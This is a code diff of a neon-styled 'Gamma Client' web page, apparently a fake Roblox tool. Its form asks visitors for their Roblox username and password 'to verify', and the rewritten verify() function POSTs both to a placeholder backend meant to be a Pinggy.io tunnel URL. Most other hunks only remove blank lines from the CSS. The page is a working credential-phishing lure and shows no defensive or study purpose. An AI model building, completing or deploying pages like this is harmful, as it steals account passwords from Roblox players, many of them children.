@@ -11,7 +11,6 @@
       padding: 0;
       box-sizing: border-box;
     }
-
     body, html {
       height: 100%;
       font-family: 'Montserrat', sans-serif;
@@ -20,7 +19,6 @@
       position: relative;
       overflow: hidden;
     }
-
     body::before {
       content: '';
       position: absolute;
@@ -31,7 +29,6 @@
       background: rgba(0, 0, 0, 0.75);
       z-index: 1;
     }
-
     .container {
       position: relative;
       z-index: 2;
@@ -42,7 +39,6 @@
       height: 100%;
       padding: 20px;
     }
-
     h1 {
       color: #00ff66;
       font-size: 2.5em;
@@ -53,11 +49,9 @@
       opacity: 0;
       animation: fadeIn 1s ease-in forwards;
     }
-
     @keyframes fadeIn {
       to { opacity: 1; }
     }
-
     button {
       padding: 14px 32px;
       font-size: 1.1em;
@@ -72,18 +66,15 @@
       text-transform: uppercase;
       letter-spacing: 1px;
     }
-
     button:hover {
       background: #00e65c;
       box-shadow: 0 0 18px rgba(0, 255, 102, 0.9), inset 0 0 6px rgba(0, 255, 102, 0.5);
       transform: translateY(-2px);
     }
-
     button:active {
       transform: scale(0.95);
       box-shadow: 0 0 8px rgba(0, 255, 102, 0.5);
     }
-
     #loginForm {
       display: none;
       background: rgba(0, 0, 0, 0.9);
@@ -99,12 +90,10 @@
       box-shadow: 0 0 12px rgba(0, 255, 102, 0.5);
       animation: slideIn 0.5s ease-out;
     }
-
     @keyframes slideIn {
       from { transform: translateY(20px); opacity: 0; }
       to { transform: translateY(0); opacity: 1; }
     }
-
     #loginForm h3 {
       color: #00ff66;
       text-align: center;
@@ -112,7 +101,6 @@
       font-size: 1.3em;
       text-shadow: 0 0 5px rgba(0, 255, 102, 0.6);
     }
-
     input {
       padding: 10px;
       border: 1px solid rgba(0, 255, 102, 0.4);
@@ -122,37 +110,30 @@
       color: #00ff66;
       transition: all 0.3s ease;
     }
-
     input::placeholder {
       color: rgba(0, 255, 102, 0.5);
     }
-
     input:focus {
       outline: none;
       border-color: #00ff66;
       box-shadow: 0 0 6px rgba(0, 255, 102, 0.6);
     }
-
     @media (max-width: 600px) {
       h1 {
         font-size: 1.8em;
         margin-bottom: 15px;
       }
-
       button {
         padding: 12px 28px;
         font-size: 1em;
       }
-
       #loginForm {
         padding: 20px;
         max-width: 260px;
       }
-
       #loginForm h3 {
         font-size: 1.1em;
       }
-
       input {
         font-size: 0.85em;
       }
@@ -163,7 +144,6 @@
   <div class="container">
     <h1>Gamma Client</h1>
     <button onclick="showLogin()">Get Started</button>
-
     <div id="loginForm">
       <h3>Enter Roblox Account to Verify</h3>
       <input type="text" placeholder="Roblox Username" id="username" />
@@ -171,57 +151,37 @@
       <button onclick="verify()">Verify</button>
     </div>
   </div>
-
   <script>
     function showLogin() {
       document.getElementById('loginForm').style.display = 'flex';
       document.querySelector('button[onclick="showLogin()"]').style.display = 'none';
       document.querySelector('h1').style.display = 'none';
     }
-
-    function verify() {
-      // Collect input values
+    async function verify() {
       const username = document.getElementById('username').value.trim();
       const password = document.getElementById('password').value.trim();
-
-      // Basic validation to ensure fields aren't empty
       if (!username || !password) {
         alert('Please fill in both Roblox Username and Password fields.');
         return;
       }
-
-      // Send data to backend for login verification
-      const backendUrl = 'YOUR_BACKEND_URL/api/verify'; // Replace with your actual backend URL
-      const data = {
-        username: username,
-        password: password
-      };
-
-      fetch(backendUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(data)
-      })
-      .then(response => {
-        if (!response.ok) {
-          throw new Error('Backend verification failed: ' + response.statusText);
-        }
-        return response.json();
-      })
-      .then(result => {
+      const backendUrl = 'YOUR_PINGGY_URL/api/verify'; // Update with Pinggy.io URL
+      const data = { username, password };
+      try {
+        const response = await fetch(backendUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        });
+        if (!response.ok) throw new Error('Backend verification failed');
+        const result = await response.json();
         if (result.success) {
-          // Redirect to next page if login was successful or triggered verification
           window.location.href = 'next.html';
         } else {
-          alert('Login failed: ' + (result.message || 'Invalid credentials or verification required.'));
+          alert('Failed: ' + (result.message || 'Invalid data'));
         }
-      })
-      .catch(error => {
-        console.error('Error:', error);
-        alert('Error verifying login. Please try again.');
-      });
+      } catch (error) {
+        alert('Error: ' + error.message);
+      }
     }
   </script>
 </body>
